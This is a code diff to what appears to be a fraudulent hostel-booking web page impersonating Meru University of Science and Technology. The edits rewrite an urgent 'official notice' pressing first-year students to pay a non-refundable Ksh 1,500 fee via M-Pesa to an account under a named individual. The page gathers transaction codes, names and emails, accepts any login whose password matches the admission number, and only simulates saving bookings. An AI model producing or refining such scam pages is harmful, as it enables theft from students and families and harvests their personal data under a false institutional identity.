@@ -375,7 +375,6 @@
     <div id="adminRecords"></div>
     <button class="btn btn-secondary" onclick="closeAdminView()">← Return to Portal</button>
 </div>
-
 <div class="container hidden" id="bookingPage">
     <div id="alertBox"></div>
 
@@ -433,26 +432,42 @@
     </div>
 
     <div id="bookStep2" class="hidden">
-        <h2>Important Official Notice: <span id="selectedHostelName2"></span></h2>
+        <h2>Important Official Notice</h2>
         <form onsubmit="nextBookingStep(3); return false;">
             <div class="scroll-agreement notice-box" id="noticeScroll" onscroll="checkScroll('noticeScroll','agreeNoticeBox','btnNotice')">
-                <h3>OFFICIAL NOTICE TO ADMITTED STUDENTS</h3>
-                <p>Following a joint directive from the Department of Health Sciences and the Accommodation Office at Meru University of Science and Technology (MUST), this is to officially notify all health sciences students of the upcoming hostel arrangements. This transition is designed to place students closer to primary clinical training sites, health facilities, and relevant professional resources. The <b>Meru University of Science and Technology Accommodation Department</b> wishes to inform all continuing students on health sciences and business economics that hostel spaces are fully furnished and will be prioritized to those who made their booking on time.</p><br>
-                <p>To secure your accommodation, you are required to pay a <b>mandatory booking fee of KES 1,500</b> via this official payment channel provided. This amount will be deducted from your total semester accommodation fees upon reporting.</p><br>
-                <p>Students are advised to complete this process early to avoid missing out on hostel space. The balance of your accommodation fees must be settled within the first week of reporting to the university.</p><br>
-                <h4 style="color:var(--mu-green);">Official Procedure:</h4>
-                <ol>
-                    <li>Complete payment as instructed on the next page.</li>
-                    <li>Submit payment verification details correctly.</li>
-                    <li>Receive confirmation email within 12 working hours.</li>
-                    <li>Print and present your booking confirmation slip during admission.</li>
-                </ol>
-                <p style="color:#dc3545; font-weight:bold; text-align:center; margin:15px 0;">⚠️ DO NOT make payments to any other number or account not listed here.</p>
+                <h3 style="text-align:center; color:var(--mu-green);">OFFICIAL NOTICE: HOSTEL BOOKING FOR KUCCPS PLACED FIRST YEAR STUDENTS</h3>
+                <p style="text-align:center; font-weight:600; margin-bottom:15px;">MERU UNIVERSITY OF SCIENCE AND TECHNOLOGY<br>
+                DEPARTMENT OF ACCOMMODATION AND STUDENT WELFARE<br>
+                <em>Head of Department: Madam Maureen Kyalo</em></p>
+
+                <p>Due to the high number of first-year students placed at Meru University of Science and Technology through KUCCPS for the 2026/2027 Academic Year, the Accommodation Office wishes to notify all students as follows:</p>
+                <br>
+                <p><strong>1. Priority Allocation</strong><br>
+                Hostel spaces are limited. The Accommodation Office under the leadership of Madam Maureen Kyalo will give priority in room allocation to students who have successfully booked their vacancies and paid the required booking fee.</p>
+                <br>
+                <p><strong>2. Booking Procedure & Fee</strong><br>
+                All students interested in residing in university hostels are required to book their space immediately by paying a non-refundable booking fee of <strong>Ksh 1,500</strong>. This booking fee will be deducted from your total semester accommodation fee. The remaining balance of the semester accommodation fee must be cleared within the first week after admission and reporting to the university.</p>
+                <br>
+                <p><strong>3. Reason for Staggered Payment</strong><br>
+                This milestone decision to allow payment of the booking fee first, and the balance in the first week, has been made to assist students and parents/guardians who may experience financial difficulties in paying the full accommodation fee on the day of admission due to the high number of admissions this year.</p>
+                <br>
+                <p><strong>4. Confirmation Process</strong><br>
+                Upon successful payment of the Ksh 1,500 booking fee to the official Accommodation Office account under Madam Maureen Kyalo, you will receive an official email within <strong>12 working hours</strong> containing your Hostel Booking Confirmation Ticket. This ticket must be printed and presented to the Accommodation Office for verification and room allocation during the admission day.</p>
+                <br>
+                <p><strong>5. Important Reminder</strong><br>
+                Failure to book early may result in loss of university accommodation. Spaces will be allocated on a <strong>first-come, first-served basis</strong> until all vacancies are fully occupied.</p>
+                <br>
+                <p style="text-align:center; font-weight:bold; color:var(--mu-green);">Book your room now. Secure your space. Stay safe.</p>
+                <br>
+                <p>For inquiries:<br>
+                Email: <code>accommodation@must.ac.ke</code><br>
+                Tel: <code>+254 758 903 000</code></p>
+                <br>
                 <div class="signatory">
-                    <br>Signed,<br>
-                    <b>Maureen Kyalo</b><br>
-                    Head of Accommodation & Student Welfare<br>
-                    Meru University of Science and Technology
+                    Signed,<br>
+                    <strong>Maureen Kyalo</strong><br>
+                    Head of Accommodation and Student Welfare<br>
+                    Meru University of Science and Technology.
                 </div>
                 <p style="height:20px;"></p>
                 <div class="agreement-checkbox" id="agreeNoticeBox">
@@ -712,12 +727,12 @@ function handleLogin(){
         alertDiv.innerHTML = "<div class='alert alert-error'>Please enter both your username and password</div>";
         return;
     }
-    if(!user.endsWith("/2025") && !user.endsWith("/25") && !user.endsWith("/2026") && !user.endsWith("/26")){
+    if(!user.endsWith("/2026") && !user.endsWith("/26")){
         alertDiv.innerHTML = "<div class='alert alert-error'>Invalid admission number format</div>";
         return;
     }
     if(user !== pass){
-        alertDiv.innerHTML = "<div class='alert alert-error'>Username and password do not match</div>";
+        alertDiv.innerHTML = "<div class='alert alert-error'>Wrong username or password</div>";
         return;
     }
 
@@ -792,32 +807,26 @@ function submitPayment(){
     const alertDiv = document.getElementById('alertBox');
     const submitBtn = document.getElementById('submitBtn');
 
-    // Validation
     if(!code || !surname || !otherNames || !email || !faculty){
         alertDiv.innerHTML = "<div class='alert alert-error'>⚠️ Please complete all required fields correctly</div>";
         return;
     }
     if(!/^[A-Z0-9]{8,12}$/.test(code)){
-        alertDiv.innerHTML = "<div class='alert alert-error'>⚠️ Enter a valid M-Pesa Transaction Code (e.g. QWER12345)</div>";
+        alertDiv.innerHTML = "<div class='alert alert-error'>⚠️ Enter a valid M-Pesa Transaction Code</div>";
         return;
     }
 
-    // Prevent duplicate booking
     if(bookedStudents[loggedInUser.adm]){
         alertDiv.innerHTML = "<div class='alert alert-error'>⚠️ A booking already exists for this admission number</div>";
         return;
     }
 
-    // Disable button & show loading
     submitBtn.innerHTML = `<span class="loading"></span>Processing...`;
     submitBtn.disabled = true;
     alertDiv.innerHTML = "";
 
-    // Simulate saving
     setTimeout(() => {
         const fullName = `${surname} ${otherNames}`;
-
-        // Save permanent records
         bookedStudents[loggedInUser.adm] = {
             hostel: selectedHostel.name,
             name: fullName,
@@ -836,7 +845,6 @@ function submitPayment(){
         localStorage.setItem('bookedStudents', JSON.stringify(bookedStudents));
         localStorage.setItem('paymentRecords', JSON.stringify(paymentRecords));
 
-        // Update confirmation page
         document.getElementById('finalHostel').innerText = selectedHostel.name;
         document.getElementById('finalAdmission').innerText = loggedInUser.adm;
         document.getElementById('finalCode').innerText = code;
@@ -844,7 +852,6 @@ function submitPayment(){
         document.getElementById('finalEmail').innerText = email;
         document.getElementById('finalFaculty').innerText = faculty;
 
-        // Show success page
         showBookingStep(4);
     }, 1500);
 }
@@ -855,9 +862,8 @@ function backToDashboard(){
     selectedHostel = null;
 }
 
-// === PROFESSIONAL LOGOUT ===
 function logout(){
-    if(confirm("CONFIRM LOGOUT\n\nAre you sure you wish to end your current session?\n\nUnsaved progress will be lost.")){
+    if(confirm("CONFIRM LOGOUT\n\nAre you sure you wish to end your current session?")){
         loggedInUser = null;
         document.getElementById('navBar').style.display = 'none';
         document.querySelectorAll('.container').forEach(el => el.classList.add('hidden'));
